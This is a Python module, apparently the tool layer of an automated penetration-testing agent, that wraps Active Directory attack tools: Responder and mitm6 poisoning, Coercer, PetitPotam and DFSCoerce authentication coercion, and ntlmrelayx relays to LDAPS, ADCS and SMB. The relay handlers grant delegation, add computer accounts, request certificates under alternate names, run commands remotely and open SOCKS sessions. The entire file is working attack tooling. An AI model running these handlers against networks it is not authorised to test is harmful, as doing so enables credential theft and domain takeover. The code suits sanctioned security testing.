"""COERCION 工具 handler: Responder/mitm6/Coercer/PetitPotam/DFScoerce/ntlmrelayx."""
from __future__ import annotations
from typing import Any
from .executor import CommandBuilder, exec_builder, precheck


async def start_responder(args: dict, state: Any = None) -> str:
    err, args = precheck("start_responder", args, state)
    if err:
        return err
    cb = CommandBuilder("responder").args("-I", str(args.get("interface", "eth0")))
    if args.get("analyze"):
        cb.args("-A")
    cb.timeout_secs(300)
    return await exec_builder(cb)


async def start_mitm6(args: dict, state: Any = None) -> str:
    err, args = precheck("start_mitm6", args, state)
    if err:
        return err
    cb = CommandBuilder("mitm6")
    cb.args("-i", str(args.get("interface", "eth0")))
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    if args.get("dns_server"):
        cb.args("--dns-server", str(args["dns_server"]))
    cb.timeout_secs(300)
    return await exec_builder(cb)


async def coercer(args: dict, state: Any = None) -> str:
    err, args = precheck("coercer", args, state)
    if err:
        return err
    cb = CommandBuilder("coercer").args("coerce")
    cb.args("--target", str(args.get("target", "")))
    cb.args("--listener", str(args.get("listener_ip", "")))
    if args.get("auth_user"):
        cb.args("--auth-user", str(args["auth_user"]))
    if args.get("auth_password"):
        cb.args("--auth-password", str(args["auth_password"]))
    cb.timeout_secs(300)
    return await exec_builder(cb)


async def petitpotam(args: dict, state: Any = None) -> str:
    err, args = precheck("petitpotam", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-petitpotam")
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("password"):
        cb.args("-p", str(args["password"]))
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    cb.args("-pipe", "lsarpc")
    cb.args(str(args.get("listener_ip", "")), str(args.get("target", "")))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def dfscoerce(args: dict, state: Any = None) -> str:
    err, args = precheck("dfscoerce", args, state)
    if err:
        return err
    cb = CommandBuilder("dfscoerce")
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("password"):
        cb.args("-p", str(args["password"]))
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    cb.args(str(args.get("listener_ip", "")), str(args.get("target", "")))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def ntlmrelayx_to_ldaps(args: dict, state: Any = None) -> str:
    err, args = precheck("ntlmrelayx_to_ldaps", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-ntlmrelayx")
    cb.args("-t", str(args.get("target", "")))
    if args.get("delegate_access"):
        cb.args("--delegate-access")
    if args.get("add_computer"):
        cb.args("--add-computer", str(args["add_computer"]))
    cb.timeout_secs(300)
    return await exec_builder(cb)


async def ntlmrelayx_to_adcs(args: dict, state: Any = None) -> str:
    err, args = precheck("ntlmrelayx_to_adcs", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-ntlmrelayx")
    cb.args("-t", str(args.get("target", "")))
    cb.args("--adcs")
    if args.get("template"):
        cb.args("--template", str(args["template"]))
    if args.get("alt_name"):
        cb.args("--alt-name", str(args["alt_name"]))
    cb.timeout_secs(300)
    return await exec_builder(cb)


async def ntlmrelayx_to_smb(args: dict, state: Any = None) -> str:
    err, args = precheck("ntlmrelayx_to_smb", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-ntlmrelayx")
    cb.args("-t", str(args.get("target", "")))
    if args.get("command"):
        cb.args("-c", str(args["command"]))
    cb.timeout_secs(300)
    return await exec_builder(cb)


async def ntlmrelayx_multirelay(args: dict, state: Any = None) -> str:
    err, args = precheck("ntlmrelayx_multirelay", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-ntlmrelayx")
    targets = str(args.get("targets", ""))
    cb.args("-tf", _targets_file(targets))
    if args.get("domain_admins"):
        cb.args("-id", str(args["domain_admins"]))
    if args.get("command"):
        cb.args("-c", str(args["command"]))
    cb.args("--socks")
    cb.timeout_secs(300)
    return await exec_builder(cb)


def _targets_file(targets: str) -> str:
    import tempfile
    lines = [t.strip() for t in targets.split(",") if t.strip()]
    fd = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, prefix="relay_")
    fd.write("\n".join(lines))
    fd.close()
    return fd.name


__all__ = [
    "start_responder", "start_mitm6", "coercer", "petitpotam", "dfscoerce",
    "ntlmrelayx_to_ldaps", "ntlmrelayx_to_adcs", "ntlmrelayx_to_smb",
    "ntlmrelayx_multirelay",
]